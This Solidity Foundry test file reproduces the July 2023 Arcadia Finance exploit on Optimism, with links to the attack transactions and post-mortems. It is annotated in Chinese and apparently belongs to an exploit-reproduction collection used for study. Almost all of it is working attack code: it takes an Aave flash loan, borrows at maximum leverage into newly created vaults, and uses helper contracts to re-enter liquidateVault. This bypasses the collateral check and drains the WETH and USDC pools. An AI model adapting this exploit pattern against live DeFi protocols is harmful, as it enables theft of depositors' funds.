// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~400K USD$
// Time : 2023-07-10
// Attacker : https://optimistic.etherscan.io/address/0xd3641c912a6a4c30338787e3c464420b561a9467
// Attack Contract : https://optimistic.etherscan.io/address/0x01a4d9089c243ccaebe40aa224ad0cab573b83c6
// Vulnerable Contract : https://optimistic.etherscan.io/address/0x13c0ef5f1996b4f119e9d6c32f5e23e8dc313109
// Attack Tx : https://optimistic.etherscan.io/tx/0xca7c1a0fde444e1a68a8c2b8ae3fb76ec384d1f7ae9a50d26f8bfdd37c7a0afe

// @Phalcon View : https://explorer.phalcon.xyz/tx/optimism/0xca7c1a0fde444e1a68a8c2b8ae3fb76ec384d1f7ae9a50d26f8bfdd37c7a0afe

// @Info
// Vulnerable Contract Code : https://optimistic.etherscan.io/address/0x3ae354d7e49039ccd582f1f3c9e65034ffd17bad#code

// @Analysis
// https://arcadiafinance.medium.com/post-mortem-72e9d24a79b0
// https://twitter.com/Phalcon_xyz/status/1678250590709899264
// https://twitter.com/peckshield/status/1678265212770693121

interface IFactory {
    function createVault(uint256 salt, uint16 vaultVersion, address baseCurrency) external returns (address vault);
}

interface LendingPool {
    function doActionWithLeverage(
        uint256 amountBorrowed,
        address vault,
        address actionHandler,
        bytes calldata actionData,
        bytes3 referrer
    ) external;
    function liquidateVault(address vault) external;
}

interface IVault {
    function vaultManagementAction(address actionHandler, bytes calldata actionData)
        external
        returns (address, uint256);
    function deposit(address[] calldata assetAddresses, uint256[] calldata assetIds, uint256[] calldata assetAmounts)
        external;
    function openTrustedMarginAccount(address creditor) external;
}

interface IActionMultiCall {}

contract Attacker is Test {
    struct ActionData {
        address[] assets;
        uint256[] assetIds;
        uint256[] assetAmounts;
        uint256[] assetTypes;
        uint256[] actionBalances;
    }

    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    // AAVE_V3 -- 一个DEX
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    // 金库工厂,用来创建金库
    // 金库(Vault)是Arcadia Finance里的概念,向金库里存入资产,可根据一定比例向对应池子借贷
    IFactory Factory = IFactory(0x00CB53780Ea58503D3059FC02dDd596D0Be926cB);
    // Arcadia Finance的保证金池子
    LendingPool darcWETH = LendingPool(0xD417c28aF20884088F600e724441a3baB38b22cc);
    LendingPool darcUSDC = LendingPool(0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d);
    // 充当金库的保证人等,用来中间周旋的合约地址
    IActionMultiCall ActionMultiCall = IActionMultiCall(0x2dE7BbAAaB48EAc228449584f94636bb20d63E65);
    // 提前声明将要操作的金库,后面要用Factory生成的
    IVault Proxy1;
    IVault Proxy2;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("optimism", 106_676_494);
        cheats.label(address(USDC), "USDC");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(aaveV3), "aaveV3");
        cheats.label(address(Factory), "Factory");
        cheats.label(address(darcWETH), "darcWETH");
        cheats.label(address(ActionMultiCall), "ActionMultiCall");
    }

    // 发起攻击
    function testExploit() public {
        // 记录攻击前的USDC和WETH余额
        emit log_named_decimal_uint(
            "Attacker USDC balance before exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker WETH balance before exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );

        // 记下WETH和USDC,分别对应0,1,一次闪电贷两个代币,预备发动两次攻击
        address[] memory assets = new address[](2);
        assets[0] = address(WETH);
        assets[1] = address(USDC);
        uint256[] memory amounts = new uint256[](2);
        // USDC看起来数量少是因为USDC.decimals()=6,而WETH.decimals()=18
        amounts[0] = 29_847_813_623_947_075_968;
        amounts[1] = 11_916_676_700;
        uint256[] memory modes = new uint[](2);
        modes[0] = 0;
        modes[1] = 0;

        // 借AAVE_V3的闪电贷,触发回调executeOperation()
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        // 记录攻击后的USDC和WETH余额
        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    // AAVE_V3闪电贷的回调函数
    // 回调接口定义: https://github.com/aave/aave-v3-core/blob/master/contracts/flashloan/interfaces/IFlashLoanSimpleReceiver.sol
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        WETH.approve(address(aaveV3), type(uint256).max);
        USDC.approve(address(aaveV3), type(uint256).max);

        // 针对WETH和USDC调用攻击方法
        WETHDrain(assets[0], amounts[0]);
        USDCDrain(assets[1], amounts[1]);

        return true;
    }

    // 攻击WETH保证金池的逻辑函数
    function WETHDrain(address targetToken, uint256 tokenAmount) internal {
        // 创建WETH金库
        Proxy1 = IVault(Factory.createVault(15_113, uint16(1), targetToken));
        // 标记金库地址
        vm.label(address(Proxy1), "Proxy1");

        // 对WETH保证金池子,将刚创建的WETH金库开设为可信保证金账户,这样就可以抵押再借款了
        Proxy1.openTrustedMarginAccount(address(darcWETH));
        WETH.approve(address(Proxy1), type(uint256).max);

        {
            address[] memory assetAddresses = new address[](1);
            assetAddresses[0] = targetToken;
            uint256[] memory assetIds = new uint256[](1);
            assetIds[0] = 0;
            uint256[] memory assetAmounts = new uint256[](1);
            assetAmounts[0] = tokenAmount;
            // 存入WETH作为抵押
            Proxy1.deposit(assetAddresses, assetIds, assetAmounts);
        }

        ActionData memory ActionData1 = ActionData({
            assets: new address[](0),
            assetIds: new uint256[](0),
            assetAmounts: new uint256[](0),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });

        ActionData memory ActionData2 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](1),
            actionBalances: new uint256[](1)
        });
        ActionData2.assets[0] = targetToken;
        address[] memory to = new address[](1);
        to[0] = targetToken;
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("approve(address,uint256)", address(Proxy1), type(uint256).max);
        bytes memory callData1 = abi.encode(ActionData1, ActionData2, to, data);
        // 以闪电贷形式,允许金库内抵押和借贷数量在一定比例内,Attacker借此尽量拉高借贷的数量
        darcWETH.doActionWithLeverage(
            WETH.balanceOf(address(darcWETH)) - 1e18, address(Proxy1), address(ActionMultiCall), callData1, bytes3(0)
        );

        // 创建一个辅助合约,用来实现重入攻击
        Helper1 helper = new Helper1(address(Proxy1));

        ActionData memory ActionData3 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });
        ActionData3.assets[0] = targetToken;
        ActionData3.assetIds[0] = 0;
        ActionData3.assetAmounts[0] = WETH.balanceOf(address(Proxy1));
        address[] memory toAddress = new address[](2);
        toAddress[0] = targetToken;
        toAddress[1] = address(helper);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encodeWithSignature("approve(address,uint256)", address(helper), type(uint256).max);
        // !!!这里将辅助合约的重入函数一起写入vaultManagementAction()的calldata里,后面一起调用实现重入
        datas[1] = abi.encodeWithSignature("rekt()");
        bytes memory callData2 = abi.encode(ActionData3, ActionData1, toAddress, datas);
        // !!!调用金库的vaultManagementAction()先提取金库所有财产,再配合辅助合约实现重入攻击
        // !!!辅助合约调用金库的liquidateVault(),清算金库,将全局变量isTrustedCreditorSet设为false
        // !!!之后vaultManagementAction()在根据getUsedMargin(),查询抵押物时,由于isTrustedCreditorSet为false,抵押物数量直接返回了0
        // !!!最终实现,绕过了抵押物检查,就提取出了包括抵押的和在此基础上借贷的WETH,从而完成攻击
        Proxy1.vaultManagementAction(address(ActionMultiCall), callData2);
    }

    // 就是在Arcadia Finance上将对针对WETH保证金池的攻击对USDC保证金池再进行了一次
    // 攻击USDC保证金池的逻辑函数,逻辑上和那次攻击一模一样的
    function USDCDrain(address targetToken, uint256 tokenAmount) internal {
        Proxy2 = IVault(Factory.createVault(15_114, uint16(1), targetToken));
        vm.label(address(Proxy2), "Proxy2");

        Proxy2.openTrustedMarginAccount(address(darcUSDC));
        USDC.approve(address(Proxy2), type(uint256).max);

        {
            address[] memory assetAddresses = new address[](1);
            assetAddresses[0] = targetToken;
            uint256[] memory assetIds = new uint256[](1);
            assetIds[0] = 0;
            uint256[] memory assetAmounts = new uint256[](1);
            assetAmounts[0] = tokenAmount;
            Proxy2.deposit(assetAddresses, assetIds, assetAmounts);
        }

        ActionData memory ActionData1 = ActionData({
            assets: new address[](0),
            assetIds: new uint256[](0),
            assetAmounts: new uint256[](0),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });
        ActionData memory ActionData2 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](1),
            actionBalances: new uint256[](1)
        });
        ActionData2.assets[0] = targetToken;
        address[] memory to = new address[](1);
        to[0] = targetToken;
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("approve(address,uint256)", address(Proxy2), type(uint256).max);
        bytes memory callData1 = abi.encode(ActionData1, ActionData2, to, data);
        darcUSDC.doActionWithLeverage(
            USDC.balanceOf(address(darcUSDC)) - 50e6, address(Proxy2), address(ActionMultiCall), callData1, bytes3(0)
        );

        Helper2 helper = new Helper2(address(Proxy2));

        ActionData memory ActionData3 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });
        ActionData3.assets[0] = targetToken;
        ActionData3.assetIds[0] = 0;
        ActionData3.assetAmounts[0] = USDC.balanceOf(address(Proxy2));
        address[] memory toAddress = new address[](2);
        toAddress[0] = targetToken;
        toAddress[1] = address(helper);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encodeWithSignature("approve(address,uint256)", address(helper), type(uint256).max);
        datas[1] = abi.encodeWithSignature("rekt()");
        bytes memory callData2 = abi.encode(ActionData3, ActionData1, toAddress, datas);
        Proxy2.vaultManagementAction(address(ActionMultiCall), callData2);
    }
}

// 辅助合约,用来实现重入攻击
contract Helper1 {
    address owner;
    address proxy;
    address ActionMultiCall = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    LendingPool darcWETH = LendingPool(0xD417c28aF20884088F600e724441a3baB38b22cc);

    constructor(address target) {
        owner = msg.sender;
        proxy = target;
    }

    // 辅助合约的重入逻辑函数
    function rekt() external {
        // 将ActionMultiCall地址上的WETH转移到Attacker地址上,且在之后Attacker地址直接扣款归还在AAVE_V3的WETH闪电贷
        WETH.transferFrom(ActionMultiCall, owner, WETH.balanceOf(address(ActionMultiCall)));
        // !!!重入攻击,Attacker清算WETH的金库
        // 具体效果是在将全局变量isTrustedCreditorSet设为false,从而影响抵押物检查
        darcWETH.liquidateVault(proxy);
    }
}

// 与Helper1同
contract Helper2 {
    address owner;
    address proxy;
    address ActionMultiCall = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    LendingPool darcUSDC = LendingPool(0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d);

    constructor(address target) {
        owner = msg.sender;
        proxy = target;
    }

    function rekt() external {
        // 与Helper1的转账同理
        USDC.transferFrom(ActionMultiCall, owner, USDC.balanceOf(address(ActionMultiCall)));
        // 与Helper1的重入逻辑同理
        darcUSDC.liquidateVault(proxy);
    }
}
